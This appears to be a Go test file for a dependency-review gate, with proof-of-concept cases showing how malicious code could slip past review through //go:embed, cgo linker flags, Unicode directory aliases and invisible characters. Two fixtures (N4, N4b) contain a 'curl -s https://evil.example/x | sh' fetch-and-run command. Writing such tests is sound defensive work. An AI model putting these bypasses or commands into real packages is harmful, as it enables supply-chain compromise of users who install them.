package gomod

import (
	"runtime"
	"slices"
	"strings"
	"testing"

	"github.com/sadbox/dep-review/internal/model"
)

// Round 9 PoCs (security review of c99ac3a). Each case must reach a person
// (some code routes human); each currently stays on review.

func r9Human(h *report) bool {
	for _, c := range h.codes() {
		if routeOf(c) == model.RouteHuman {
			return true
		}
	}
	return false
}

func r9Log(t *testing.T, h *report) {
	t.Helper()
	t.Logf("codes %v\nflagged %v\nincomplete %v", h.codes(), h.flagged("m"), h.items(codeIncomplete))
}

const r9Payload = "\x7fELF\x02\x01\x01\x00" + "\x00EVIL\x00EVIL\x00EVIL\x00EVIL"

// N1a: "newly reachable" compares against the OLD tree's reachability,
// which is an over-approximation. One innocuous "#cgo" in a comment of the
// old version (moduleLinks is a substring test) makes every testdata file
// "reachable" in the old tree, so nothing under testdata/ can ever become
// newly reachable. The new version adds a real //go:embed of the
// unchanged fixture: only the directive is flagged (review, shown in
// full); the bytes it puts into the program are never flagged. Main
// hard-stopped the new //go:embed.
func TestR9OldLinksMasksNewEmbed(t *testing.T) {
	doc := "// Package p. No #cgo here.\npackage p\n"
	emb := "package p\n\nimport _ \"embed\"\n\n//go:embed testdata/tool.bin\nvar Tool []byte\n"
	old := writeTree(t, map[string]string{"p.go": doc, "testdata/tool.bin": r9Payload})
	cur := writeTree(t, map[string]string{"p.go": doc, "e.go": emb, "testdata/tool.bin": r9Payload})
	h := CheckTrees(old, cur)
	r9Log(t, h)
	wantPerson(t, h, "testdata/tool.bin")
}

// N1b: same with assembly sources already in the module (common: x/sys,
// x/crypto, klauspost/compress) and a new cgo link line for an unchanged
// testdata archive (the B2b case, with links in the old tree).
func TestR9OldAsmMasksNewCgoLink(t *testing.T) {
	asm := "#include \"textflag.h\"\nTEXT ·f(SB),NOSPLIT,$0\n\tRET\n"
	cgo := "package p\n\n/*\n#cgo LDFLAGS: -L${SRCDIR}/testdata -lfoo\nint evil(void);\n*/\nimport \"C\"\n\nfunc F() int { return int(C.evil()) }\n"
	old := writeTree(t, map[string]string{"p.go": "package p\n", "f_amd64.s": asm, "testdata/libfoo.a": arV1})
	cur := writeTree(t, map[string]string{"p.go": "package p\n", "f_amd64.s": asm, "c.go": cgo, "testdata/libfoo.a": arV1})
	h := CheckTrees(old, cur)
	r9Log(t, h)
	wantPerson(t, h, "testdata/libfoo.a")
}

// N1c: an old pattern the gate models as "any file" ([ ] class) makes every
// file under the package directory reachable in the old tree.
func TestR9OldClassPatternMasksNewEmbed(t *testing.T) {
	css := "package p\n\nimport \"embed\"\n\n//go:embed static/[a-z]*.css\nvar CSS embed.FS\n"
	emb := "package p\n\nimport _ \"embed\"\n\n//go:embed testdata/tool.bin\nvar Tool []byte\n"
	old := writeTree(t, map[string]string{"p.go": css, "static/a.css": "a{}", "testdata/tool.bin": r9Payload})
	cur := writeTree(t, map[string]string{"p.go": css, "e.go": emb, "static/a.css": "a{}", "testdata/tool.bin": r9Payload})
	h := CheckTrees(old, cur)
	r9Log(t, h)
	wantPerson(t, h, "testdata/tool.bin")
}

// N2: the cgo/C/asm rule covers only testdata/ and linkExts. The go
// command's LDFLAGS allowlist takes a direct linker input ending .tbd
// (security.go: [a-zA-Z0-9_/].*\.(a|o|obj|dll|dylib|so|tbd)), and GNU ld
// links it by content. ".tbd" is not in linkExts, so an unchanged
// lib/evil.tbd newly linked by a new cgo file is unflagged. Confirmed in
// golang:1.27 (linux): go run prints "evil() from lib/evil.tbd = 1337".
// (go 1.27.3 also accepts -l:payload.dat; 1.27.4 rejects it.)
func TestR9TbdUnchanged(t *testing.T) {
	cgo := "package p\n\n/*\n#cgo LDFLAGS: ${SRCDIR}/lib/evil.tbd\nint evil(void);\n*/\nimport \"C\"\n\nfunc F() int { return int(C.evil()) }\n"
	old := writeTree(t, map[string]string{"p.go": "package p\n", "lib/evil.tbd": r9Payload})
	cur := writeTree(t, map[string]string{"p.go": "package p\n", "c.go": cgo, "lib/evil.tbd": r9Payload})
	h := CheckTrees(old, cur)
	r9Log(t, h)
	wantPerson(t, h, "lib/evil.tbd")
}

// N3: the embedding file's directory is the non-ASCII alias, not the
// binary's. conﬁg/p.go (//go:embed testdata/*.bin) merges into config/
// on APFS; config/testdata/payload.bin is ASCII, so the !ascii(rel) rule
// never fires and embeds are keyed by fold("conﬁg") != "config".
// Linux only: macOS may or may not merge the dirs in writeTree.
func TestR9LigatureEmbedderDir(t *testing.T) {
	if runtime.GOOS == "darwin" {
		t.Skip("the result depends on how the macOS file system folds the ligature; run on Linux")
	}
	a := "package config\n\n// Name is the package name.\nconst Name = \"config\"\n"
	p := "package config\n\nimport (\n\t\"embed\"\n\t\"fmt\"\n)\n\n//go:embed testdata/*.bin\nvar fixtures embed.FS\n\nfunc init() {\n\tb, _ := fixtures.ReadFile(\"testdata/payload.bin\")\n\tfmt.Printf(\"embedded %q\\n\", b)\n}\n"
	old := writeTree(t, map[string]string{"config/a.go": a, "config/testdata/payload.bin": "\x00old fixture"})
	cur := writeTree(t, map[string]string{"config/a.go": a, "conﬁg/p.go": p, "config/testdata/payload.bin": r9Payload})
	if !slices.Contains(cur.Files, "con\ufb01g/p.go") {
		t.Skipf("host file system merged the directories (%v); run on Linux", cur.Files)
	}
	h := CheckTrees(old, cur)
	r9Log(t, h)
	wantPerson(t, h, "config/testdata/payload.bin")
}

// N4: an unchanged TEXT file newly embedded. isBinaryFile limits the
// newly-reachable scan to binaries, and the reviewer's evidence is the
// module diff plus flagged.md: the script's text is in neither. Main
// hard-stopped the new //go:embed (and os/exec).
func TestR9UnchangedTextNewlyEmbedded(t *testing.T) {
	script := "#!/bin/sh\ncurl -s https://evil.example/x | sh\n"
	run := "package p\n\nimport (\n\t_ \"embed\"\n\t\"os/exec\"\n)\n\n// Setup runs the fixture setup script.\n//\n//go:embed testdata/setup.sh\nvar setup string\n\nfunc Setup() error { return exec.Command(\"sh\", \"-c\", setup).Run() }\n"
	old := writeTree(t, map[string]string{"p.go": "package p\n", "testdata/setup.sh": script})
	cur := writeTree(t, map[string]string{"p.go": "package p\n", "run.go": run, "testdata/setup.sh": script})
	h := CheckTrees(old, cur)
	ev := string(h.render("m"))
	r9Log(t, h)
	if !strings.Contains(ev, "evil.example") && !r9Human(h) {
		t.Errorf("testdata/setup.sh is newly embedded and run; its text is not in flagged.md and the module stays on review")
	}
}

// N5: variation selectors other than U+FE0F (and the supplement
// U+E0100..E01EF, Mongolian FVS, U+17B5) are default-ignorable and render
// as nothing; visible() passes them raw. A string literal reads as
// "localhost" but is not.
func TestR9VariationSelectorsInvisible(t *testing.T) {
	for _, r := range []rune{0xFE00, 0xFE0E, 0xE0100, 0xE01EF, 0x180B, 0x180F, 0x17B5, 0x2065} {
		if got := visible("localhost" + string(r)); strings.ContainsRune(got, r) {
			t.Errorf("U+%04X shown raw: %q", r, got)
		}
	}
}

// N1d: nothing planted: the old module already has assembly (a .s file)
// and a testdata fixture; the new version embeds the unchanged fixture.
func TestR9OldAsmMasksNewEmbed(t *testing.T) {
	asm := "#include \"textflag.h\"\nTEXT ·f(SB),NOSPLIT,$0\n\tRET\n"
	emb := "package p\n\nimport _ \"embed\"\n\n//go:embed testdata/tool.bin\nvar Tool []byte\n"
	old := writeTree(t, map[string]string{"p.go": "package p\n\nfunc f()\n", "f_amd64.s": asm, "testdata/tool.bin": r9Payload})
	cur := writeTree(t, map[string]string{"p.go": "package p\n\nfunc f()\n", "f_amd64.s": asm, "e.go": emb, "testdata/tool.bin": r9Payload})
	h := CheckTrees(old, cur)
	r9Log(t, h)
	wantPerson(t, h, "testdata/tool.bin")
}

// N4b: an unchanged C file in a directory with no Go files (never built
// on its own) is newly #included by a new cgo preamble. The preamble is
// quoted; csrc/evil.c is in no evidence file.
func TestR9UnchangedCNewlyIncluded(t *testing.T) {
	evil := "#include <stdlib.h>\nint evil(void) { return system(\"curl -s https://evil.example/x | sh\"); }\n"
	cgo := "package p\n\n/*\n#include \"csrc/evil.c\"\n*/\nimport \"C\"\n\nfunc init() { C.evil() }\n"
	old := writeTree(t, map[string]string{"p.go": "package p\n", "csrc/evil.c": evil})
	cur := writeTree(t, map[string]string{"p.go": "package p\n", "c.go": cgo, "csrc/evil.c": evil})
	h := CheckTrees(old, cur)
	r9Log(t, h)
	if ev := string(h.render("m")); !strings.Contains(ev, "evil.example") && !r9Human(h) {
		t.Errorf("csrc/evil.c is newly compiled; its text is not in flagged.md and the module stays on review")
	}
}
